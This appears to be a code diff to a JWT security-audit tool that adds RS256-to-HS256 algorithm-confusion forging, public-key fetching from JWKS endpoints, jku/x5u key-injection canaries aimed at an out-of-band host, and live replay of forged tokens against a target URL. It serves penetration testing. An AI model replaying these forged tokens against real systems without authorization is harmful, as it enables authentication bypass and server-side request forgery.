@@ -141,7 +141,8 @@ def generate_jwt_attack_variants(
     token: str,
     claims_override: Optional[Dict[str, Any]] = None,
     known_secret: Optional[str] = None,
-    public_key_pem: Optional[str] = None
+    public_key_pem: Optional[str] = None,
+    oast_domain: Optional[str] = None
 ) -> List[Dict[str, Any]]:
     """
     Generates a suite of offensive JWT mutations targeting:
@@ -157,6 +158,12 @@ def generate_jwt_attack_variants(
     bytes of the PEM text) as the HMAC secret for the alg-confusion variant.
     This mirrors the classic RS256->HS256 confusion attack and requires no
     asymmetric crypto library - only stdlib `hmac`/`hashlib` via `forge_jwt`.
+
+    `oast_domain` is optional; when supplied, the jku/x5u out-of-band canary
+    variants point their remote key-fetch URL at that live OAST host (so a
+    server that fetches the key triggers a recordable interaction). When it is
+    None, the literal `OAST_CANARY` placeholder is kept for offline/structural
+    inspection.
     """
     parsed = parse_jwt(token)
     header = parsed["header"]
@@ -175,6 +182,10 @@ def generate_jwt_attack_variants(
                 escalated_payload[bool_key] = True
 
     variants: List[Dict[str, Any]] = []
+
+    # Live OAST host for jku/x5u remote key-fetch canaries, or the literal
+    # placeholder when no out-of-band listener domain was resolved.
+    canary_host = (oast_domain or "OAST_CANARY").strip().rstrip("/") or "OAST_CANARY"
 
     # 1. Alg None Attacks (with original payload and escalated payload)
     for alg_val in ["none", "None", "NONE"]:
@@ -249,7 +260,7 @@ def generate_jwt_attack_variants(
 
     # 3f. JKU out-of-band canary (attacker-controlled remote key fetch)
     jku_canary_header = dict(header)
-    jku_canary_header["jku"] = "https://OAST_CANARY/jwks.json"
+    jku_canary_header["jku"] = f"https://{canary_host}/jwks.json"
     variants.append({
         "vector": "jku_canary_injection",
         "description": "Header jku URL pointing to an out-of-band attacker-controlled JWKS endpoint",
@@ -258,7 +269,7 @@ def generate_jwt_attack_variants(
 
     # 3g. X5U out-of-band canary (attacker-controlled remote X.509 cert fetch)
     x5u_canary_header = dict(header)
-    x5u_canary_header["x5u"] = "https://OAST_CANARY/jwks.json"
+    x5u_canary_header["x5u"] = f"https://{canary_host}/jwks.json"
     variants.append({
         "vector": "x5u_canary_injection",
         "description": "Header x5u URL pointing to an out-of-band attacker-controlled certificate endpoint",
@@ -304,6 +315,106 @@ def generate_jwt_attack_variants(
     return variants
 
 
+def _der_len(length: int) -> bytes:
+    """DER length octets (short or long form)."""
+    if length < 0x80:
+        return bytes([length])
+    out = b""
+    while length:
+        out = bytes([length & 0xFF]) + out
+        length >>= 8
+    return bytes([0x80 | len(out)]) + out
+
+
+def _der_tlv(tag: int, value: bytes) -> bytes:
+    return bytes([tag]) + _der_len(len(value)) + value
+
+
+def _der_uint(data: bytes) -> bytes:
+    """DER unsigned INTEGER (strip leading zeros, pad if high bit set)."""
+    data = data.lstrip(b"\x00") or b"\x00"
+    if data[0] & 0x80:
+        data = b"\x00" + data
+    return _der_tlv(0x02, data)
+
+
+def jwk_rsa_to_pem(n_b64url: str, e_b64url: str) -> str:
+    """
+    Converts an RSA JWK (modulus `n`, exponent `e`, both base64url) into a PEM
+    SubjectPublicKeyInfo public key using only the standard library. This yields
+    the exact public-key material an agent needs for the RS256->HS256
+    algorithm-confusion attack without pulling in an asymmetric crypto library.
+    """
+    n = b64url_decode(n_b64url)
+    e = b64url_decode(e_b64url)
+    rsa_pubkey = _der_tlv(0x30, _der_uint(n) + _der_uint(e))
+    # AlgorithmIdentifier: rsaEncryption OID 1.2.840.113549.1.1.1 + NULL params
+    algo_id = _der_tlv(
+        0x30,
+        _der_tlv(0x06, bytes([0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01]))
+        + _der_tlv(0x05, b"")
+    )
+    spki = _der_tlv(0x30, algo_id + _der_tlv(0x03, b"\x00" + rsa_pubkey))
+    b64 = base64.b64encode(spki).decode("ascii")
+    body = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
+    return f"-----BEGIN PUBLIC KEY-----\n{body}\n-----END PUBLIC KEY-----\n"
+
+
+async def fetch_public_key_from_jwks(
+    jwks_url: str,
+    upstream_proxy: Optional[str] = None
+) -> Optional[str]:
+    """
+    Fetches a JWKS (or a URL that directly serves a PEM public key / certificate)
+    and returns a PEM string usable as the HMAC secret for the RS256->HS256
+    alg-confusion variant, or None when no RSA key could be extracted.
+    """
+    if upstream_proxy and upstream_proxy.strip():
+        proxy_kwargs = {"proxy": upstream_proxy.strip()}
+    else:
+        proxy_kwargs = {"proxy": None, "trust_env": False}
+
+    try:
+        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=8.0, **proxy_kwargs) as client:
+            r = await client.get(jwks_url.strip())
+            text = r.text or ""
+    except Exception:
+        return None
+
+    stripped = text.strip()
+    if "BEGIN PUBLIC KEY" in stripped or "BEGIN RSA PUBLIC KEY" in stripped or "BEGIN CERTIFICATE" in stripped:
+        return stripped
+
+    try:
+        data = json.loads(stripped)
+    except Exception:
+        return None
+
+    keys = None
+    if isinstance(data, dict):
+        keys = data.get("keys")
+        if not keys and data.get("kty"):
+            keys = [data]
+    if not keys or not isinstance(keys, list):
+        return None
+
+    for jwk in keys:
+        if not isinstance(jwk, dict):
+            continue
+        if (jwk.get("kty") or "").upper() == "RSA" and jwk.get("n") and jwk.get("e"):
+            try:
+                return jwk_rsa_to_pem(jwk["n"], jwk["e"])
+            except Exception:
+                continue
+        x5c = jwk.get("x5c")
+        if isinstance(x5c, list) and x5c and isinstance(x5c[0], str):
+            cert_b64 = x5c[0]
+            body = "\n".join(cert_b64[i:i + 64] for i in range(0, len(cert_b64), 64))
+            return f"-----BEGIN CERTIFICATE-----\n{body}\n-----END CERTIFICATE-----\n"
+
+    return None
+
+
 async def audit_jwt_security(
     token: str,
     test_url: Optional[str] = None,
@@ -312,7 +423,9 @@ async def audit_jwt_security(
     claims_override: Optional[Dict[str, Any]] = None,
     upstream_proxy: Optional[str] = None,
     project: str = "default",
-    agent_id: str = "primary_agent"
+    agent_id: str = "primary_agent",
+    public_key_pem: Optional[str] = None,
+    jwks_url: Optional[str] = None
 ) -> Dict[str, Any]:
     """
     Audits a JWT token against offline weaknesses and optionally conducts live
@@ -331,11 +444,36 @@ async def audit_jwt_security(
     cracked = crack_weak_secret(token_clean)
     cracked_secret = cracked[0] if cracked else None
 
+    # 1b. Resolve attacker-controlled public key for RS256->HS256 alg confusion
+    #     (supplied directly, or fetched from a JWKS / PEM endpoint).
+    resolved_pubkey = (public_key_pem or "").strip() or None
+    if not resolved_pubkey and jwks_url and jwks_url.strip():
+        resolved_pubkey = await fetch_public_key_from_jwks(jwks_url.strip(), upstream_proxy)
+
+    # 1c. Resolve a live OAST host for jku/x5u out-of-band key-fetch canaries so
+    #     a server that fetches the forged key produces a recordable interaction
+    #     (correlate afterwards via poll_oast_events on the returned token).
+    oast_meta: Optional[Dict[str, Any]] = None
+    oast_domain: Optional[str] = None
+    try:
+        from backend.oast_engine import generate_oast_token
+        oast_meta = generate_oast_token(
+            project=project,
+            vuln_type="JWT_JKU_X5U_SSRF",
+            description="JWT jku/x5u out-of-band remote key fetch"
+        )
+        oast_domain = (oast_meta.get("dns_hostname") or "").strip() or None
+    except Exception:
+        oast_meta = None
+        oast_domain = None
+
     # 2. Generate Attack Tokens
     variants = generate_jwt_attack_variants(
         token=token_clean,
         claims_override=claims_override,
-        known_secret=cracked_secret
+        known_secret=cracked_secret,
+        public_key_pem=resolved_pubkey,
+        oast_domain=oast_domain
     )
 
     findings: List[Dict[str, Any]] = []
@@ -416,6 +554,14 @@ async def audit_jwt_security(
                                 "evidence": f"Endpoint returned HTTP {res.status_code} accepting token signed with empty secret.",
                                 "remediation": "Verify signing key is non-null and loaded from secure configuration."
                             })
+                        elif "alg_confusion" in v["vector"]:
+                            findings.append({
+                                "title": "JWT Algorithm Confusion (RS256 -> HS256) Signature Bypass",
+                                "severity": "CRITICAL",
+                                "vector": v["vector"],
+                                "evidence": f"Endpoint returned HTTP {res.status_code}: the token was accepted when re-signed as HS256 using the server's own RSA public key as the HMAC secret.",
+                                "remediation": "Pin the expected algorithm server-side; never allow the token header to select the verification algorithm. Verify RS256 strictly with the public key."
+                            })
 
                     live_replay_results.append({
                         "vector": v["vector"],
@@ -456,7 +602,7 @@ async def audit_jwt_security(
                         "error": str(ex)
                     })
 
-    return {
+    result: Dict[str, Any] = {
         "token_metadata": {
             "header": parsed["header"],
             "payload": parsed["payload"]
@@ -464,6 +610,16 @@ async def audit_jwt_security(
         "weak_secret_cracked": cracked_secret,
         "findings": findings,
         "attack_variants_generated": len(variants),
+        "alg_confusion_tested": bool(resolved_pubkey),
         "live_replay_tested": bool(test_url),
         "live_replay_results": live_replay_results
     }
+    if oast_meta:
+        result["oast_correlation"] = {
+            "token": oast_meta.get("token"),
+            "dns_hostname": oast_meta.get("dns_hostname"),
+            "note": "jku/x5u variants point remote key-fetch at this OAST host. "
+                    "After replay, call poll_oast_events(token) to confirm the server "
+                    "fetched the attacker-controlled key (blind SSRF / key injection)."
+        }
+    return result
